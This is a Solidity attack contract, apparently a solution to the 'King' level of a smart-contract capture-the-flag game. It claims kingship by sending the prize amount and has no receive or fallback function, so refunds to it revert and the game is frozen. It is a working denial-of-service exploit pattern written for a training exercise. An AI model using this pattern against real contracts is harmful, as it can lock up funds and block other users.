// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IKing {
    function prize() external returns (uint256);
    receive() external payable;
}

// the contract has no receive/fallback functions, so it would not accept transfers in most cases
// excepts coinbase tx and selfdestruct transfers
// but that's enough for the level
contract MyKingAttack {
    address payable private _kingInstanceAddress;

    error ValueIsLessThanPrize(uint256 value, uint256 prize);

    constructor (address payable kingInstanceAddress) {
        _kingInstanceAddress = kingInstanceAddress;
    }

    function attack() external payable {
        uint256 prize = IKing(_kingInstanceAddress).prize();
        if (msg.value < prize) {
            revert ValueIsLessThanPrize(msg.value, prize);
        }
        (bool success, ) = _kingInstanceAddress.call{value: msg.value}("");
        require(success);
    }

    // in real life we would add some withdraw functionality

}
